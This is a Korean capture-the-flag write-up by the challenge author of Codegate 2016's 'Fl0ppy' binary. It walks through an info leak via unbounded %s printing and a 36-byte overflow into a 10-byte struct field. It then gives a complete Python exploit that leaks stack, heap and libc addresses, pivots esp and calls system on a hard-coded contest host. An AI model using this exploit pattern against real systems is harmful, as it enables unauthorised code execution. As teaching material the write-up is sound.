# Fl0ppy

출처: https://bpsecblog.wordpress.com/2016/03/18/codegate2016_fl0ppy/

주니어 본선 진출자 분들께 라이트업도 싹 받았겠다.. 문제 출제자 최오리군이 직접 써둔 Fl0ppy 문제의 write-up을 퍼다 날라봅니다. 자기가 만든 문제 풀겠다고 고뇌하는 본격 최오리 의식의 흐름 write-up 되겠습니다.

------

음…. 일단 이 문제는 원래 주니어 부문 문제였는데 어찌어찌하다 보니까 시니어 부문에도 같이 내게 되었네요… ㅎㅎ… (심지어 원래는 더 어려웠다능…)

문제를 ‘최대한 적은 취약점으로 많은 일을 할 수 있게(많은 삽질을 할 수 있게) 만들어 보자’ 라는 생각을 하고 만들었기 때문에, 취약점은 ‘누가 봐도 취약점이다!!’ 라는 생각이 들게끔 만들었어요ㅋㅋㅋ 그래서 결국 이 문제는 취약점 2개로 모든 exploit이 가능하죠. 그게 핵심이고 그 외는 차근차근 맞춰나가면 됩니다ㅎㅎ

사실 이렇다보니 문제가 좀 쉬워져서 많은 사람들이 푸실 줄 알았는데 40팀밖에 못 푸셨다는 게 아쉽네요 ㅠㅠ (심지어 주니어 부분에 출제하려고 만들었던건데 주니어는 2명밖에 못풀다니… 흐어엉ㅠㅠ)

암튼!! 이제 이 fl0ppy라는 문제에 대해서 차근차근 알아가 봅시당 ㅎㅎ

fl0ppy 바이너리는 32bit 리눅스 실행 파일입니다. 보호 기법은 PIE, NX만 걸려 있구요.(뒤에 살짝 반전이 있음ㅋ)

------

#### Analysis

일단 먼저 main 함수부터 볼게요.

![Fl0ppy 1](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-1.png?w=605&h=1132)[그림 1] main 함수!

일단 floppy1, floppy2 가 구조체라는 것은 간단히 알 수 있죠ㅎㅎ 이 구조체는 다음과 같습니다.

> Struct floppy{
>
> Int usable;
>
> Char * data;
>
> Char description[10];
>
> Int size;
>
> }

일단 구조체이기 때문에 size가 제일 위에 저장되고 usable이 제일 밑에 저장됩니다.

이 프로그램에서는 이 구조체를 두 개 사용하는 데 이런 특성으로 인해 스택에 메모리가 아래와 같이 쌓이게 됩니다.

![Floppy 2](https://bpsecblog.files.wordpress.com/2016/03/floppy-2.png?w=359&h=478)스택에 구조체가 이렇게 쌓이죠!

다시 메인 함수로 돌아와서 간단히 쓱 보면, menu에서 정하면 그에 대한 작업을 진행하는 거 같네요?

그럼 메뉴부터 봅시다.

![Fl0ppy 3](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-3.png?w=594&h=215)메뉴!!

여러가지 기능이 있네요. 먼저 플로피를 선택하고, 뭔가를 쓰고, 읽고, 수정하고 마지막은 종료하는 기능이겠죠.

음… 아무래도 집중적으로 중간에 있는 3개의 메뉴들에 대해서 잘 분석을 해야겠네요 ㅋㅋ 이제 본격적으로 삽질을 시작해 봅시다~!!

![Fl0ppy 4](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-4.png?w=584&h=403)2번 메뉴에 들어가면 이런 코드를 볼 수 있습니다!

Write 함수에 들어가면 보이는 함수를 봅시다. 함수에서는 floppy에 데이터들을 처음 할당을 시작하네요. 일단 보면, 처음에 인자값이 있는 지 있는 지 여부를 체크 합니다. 즉 메뉴 1번에서 플로피를 선택해 줬는 지를 체크하는 거죠.

플로피를 선택했는 지를 체크하면, 본격적으로 플로피 구조체에 내용을 넣기 시작합니다. 먼저 512byte를 malloc해서 그 안에 데이터를 넣어주고 할당한 지역의 주소를 data에 저장합니다. 그런 다음 description에 데이터를 입력 받네요. 이 부분에서는 취약점이 없어 보입니다.

다음 read 함수로 들어가 볼게요.

![Fl0ppy 5](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-5.png?w=633&h=204)read 함수입니다

이 함수에서는 구조체의 정보들을 출력 해주네요. 그런데 description과 data를 출력해 주는 부분에서 어느 정도 출력하는 지에 대한 제한이 없죠. %s로 출력을 할 경우 NULL을 만날 때까지 출력해주는 데, 이를 이용해서 메모리 릭을 할 수도 있겠죠?? Data 부분은 위에서 봤듯이 힙에 저장되는 값이기 때문에, description부분에서 릭을 해서 얻을 수 있는 정보가 더 많겠네요 ㅎㅎ

이제 마지막으로 modify 함수를 보겠습니다.

![Fl0ppy 6](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-6.png?w=524&h=593)modify 함수!

일단 먼저 어느 파트를 수정할 지를 정하고 그에 대한 값을 입력하네요???? 근데????

![Fl0ppy 7](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-7.png?w=740)이거 취약점!!! 존x 취약점!!! (ㅈㅅ…)

원래 description은 10byte인데, 여기에서는 최대 37(0x25)byte를 받아서 36byte까지 복사할 수 있네요!!!

취약점 찾았당 꺄륵꺄륵!!

뭔가 오버플로우를 일으킬 수 있을 거 같아요!!

자 그럼 이제 gdb로 보면서 어디까지 덮어서 무엇을 할 수 있을 지 봅시당! (취약점을 찾아서 상당히 기분이 좋음 꺄륵)

![Fl0ppy 8](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-8.png?w=520&h=333)프롤로그

![Fl0ppy 9](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-9.png?w=497&h=159)에필로그

음??? 뭔가 우리가 평소에 보던 프롤로그랑 에필로그가 아닌데??? Leave ret아 어디갔니 ㅠㅠㅠㅠㅠㅠ 그러면 프로그램을 실행해보면서 우리가 어디까지 컨트롤할 수 있는 지 봐야겠네요 ㅠㅠ (이제부터가 삽질의 시작…)

에필로그 시작 부분에 브레이크 포인트를 걸고 프로그램을 실행시켜 보았습니다.

![Fl0ppy A](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-a.png?w=565&h=618)분석ㄱㄱ

bbbb 부분은 flopp2의 description 에 입력한 부분이고, aaaa가 floppy1의 description에 입력한 부분인데 역시 위에서 유추한대로 스택이 형성 되었네요. (역시 난 천재인듯 ㅈㅅ)

ebp가 0xbffff418이네요. 메모리를 함 볼까요?

![Fl0ppy B](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-b.png?w=615&h=189)스택!

빨간색 부분이 ebp가 가리키는 부분이네요! 그럼 에필로그에서 esp를 ebp-0x8로 옮기고 pop ecx를 하니까 0xbffff410에 있는 값을 ecx에 넣겠네요!!

그런 다음 마지막에 esp를 ecx-0x4로 옮겨서 거기에 있는 값으로 리턴하게 됩니다. 그러면 위 메모리에 따르면 0xbffff430-0x4에 있는 값으로 리턴하게 되겠네요 ㅎㅎ

![Fl0ppy C](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-c.png?w=611&h=187)0xbffff430-0x4!

음 그러면 우리가 덮을 수 있는 크기는 36바이트인데 이 리턴어드레스를 덮기에는 너무 머네요 ㅠㅠ 흠… 그러면 뭘 할 수 있을까요??

![Fl0ppy D](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-d.png?w=595&h=183)esp! esp!

바로 esp!!! esp를 조져야 합니다!!! ㅋㅋㅋㅋㅋ

esp 정도는 36바이트로 충분히 조질 수 있겠군요 훗

음 그러면 우리가 esp를 우리가 넣은 페이로드를 가리키게해서 RTL을 하면 쉘을 띄울 수 있겠습니다!! 꺄꺄

------

그럼 이제 우리가 필요한 것이 무엇인지 볼까요?

> - System의 주소 -> libc의 주소가 필요함.
> - Payload의 주소 -> 페이로드를 description에 저장 -> 스택의 주소가 필요함.

![Fl0ppy E](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-e.png?w=602&h=185)stack의 주소, ret addr의 주소!

메모리를 보면 빨간색으로 쳐진 부분의 윗 부분은 스택의 주소이고 밑에는 리턴어드레스의 주소입니다. 이 두 부분을 릭하면 되는 데 어떻게 릭할까요?

description을 modify할 때 이 두 부분의 바로 밑에까지 오버플로우를 시키면, 메뉴 3번에서 description을 출력할 때 뒤에 내용을 널바이트를 만날 때까지 출력하게될 겁니다!! ㅎㅎ 그럼 2번의 오버플로우를 통해 위의 주소들을 릭해올 수 있겠네요~

때문에 먼저 스택 주소를 릭하기 위해서 description을 16바이트를 넣어주면 스택의 주소를 릭할 수 있게 됩니당 ㅎㅎ

![Fl0ppy F](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-f.png?w=575&h=479)오오오 릭했당 ㄱㅇㄷ

그러면 이번에는 32바이트를 넣어서 리턴어드레스를 릭해볼게요 ㅎㅎ

![Fl0ppy G](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-g.png?w=565&h=407)왜안되는거?ㅠㅠ

그런데 문제가 생깁니다!! ㅠㅠ 이게 왜 이러지…

다시 한번 메인 함수에서 3번 메뉴에 들어갈 때 부분을 살펴 볼게요.

![Fl0ppy H](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-h.png?w=508&h=591)다시 한 번 봅시다

코드에서 볼 수 있다시피 floppy_using이 플로피들의 주소가 맞는 지 체크를 하게 됩니다. 때문에 스택 주소를 릭할 때에는 문제가 안되지만 ,리턴어드레스를 릭하기 위해서 description에 데이터를 저장할 때 스택 주소 부분에는 그대로 데이터를 넣어주어야 합니다. 그래야만 3번 메뉴에 들어가 리턴어드레스를 릭할 수 있게 되는거죠 ㅎㅎ (이게 아까 말한 약간의 반전이랄까… SSP를 안 넣는 대신에 넣어봤어요 ㅋㅋㅋ)

------

#### Exploit

 

그럼 이제 우리의 페이로드를 구성해 봅시다 ㅎㅎ

![Fl0ppy 2](https://bpsecblog.files.wordpress.com/2016/03/fl0ppy-2.png?w=355&h=472)여길 봅시다

오 힙을 릭할 수 있겠네요!! Floppy2의 description에서 오버플로우를 일으켜서 floppy1의 data를 릭하게 되면 data의 주소를 알 수 있겠죠!! 그럼 floppy1의 data에 command를 넣고 이 주소를 인자로 주면??

우리가 원하는 만큼 명령어를 줄 수 있어요!! 무려 512byte나 있음!!!

자 그럼 익스 코드를 짜볼까요!! :)

#### ex.py

``` py
from socket import *
from struct import pack, unpack
 
HOST = '175.119.158.134'
PORT = 5559
 
p = lambda x : pack("<L", x)
up = lambda x : unpack("<L", x)[0]
 
s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
 
raw_input("Enter")
 
SIZE =1024
 
data = s.recv(SIZE)
print data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("2\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("AAAA\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("AAAA\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("2\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("2\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("BBBB\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("BBBB\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("4\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("2\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("cat /home/fl0ppy/1e77461abb8c903ded93de4573d55c2e_flag;\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
print "******************* Command Inserted ***********************"
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("4\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("S"*16+"\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("3\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
stack = data.split("S"*16)[1][:4]
print "Stack : %s" % repr(stack)
print "******************* First Leak : STACK ***********************"
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("2\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("4\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("H"*20+"\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("3\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
heap = data.split("H"*20)[1][:4]
print "Heap : %s" % repr(heap)
print "******************* Second Leak : HEAP ***********************"
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("4\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("L"*16+stack+";sh;"*3+"\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("3\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
print repr(data.split(";sh;;sh;;sh;")[1][:4])
libc = data.split(";sh;;sh;;sh;")[1][:4]
print "Libc : %s " % repr(libc)
 
base = up(libc)-0x1872e
system_func = base + 0x3acf0
 
print "System : %s" % repr(p(system_func))
print "******************* Third Leak : LIBC ***********************"
 
s.send("4\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("1\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
rop_payload = p(system_func) + "AAAA" + heap + "AAAA"
print "Rop payload : %s" % repr(rop_payload)
print "******************* ROP payload Generated ***********************"
con_esp = up(stack) + 4 + 8
payload = rop_payload+stack+p(con_esp)+p(system_func)+"\n"
print "Overflow payload : %s" % repr(payload)
print "******************* Payload for controling esp Generated ***********************"
 
s.send(payload)
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.send("5\n")
data = s.recv(SIZE)
print "FIRST RECV : %s" % data
data = s.recv(SIZE)
print "SECOND RECV : %s" % data
 
s.close()
```

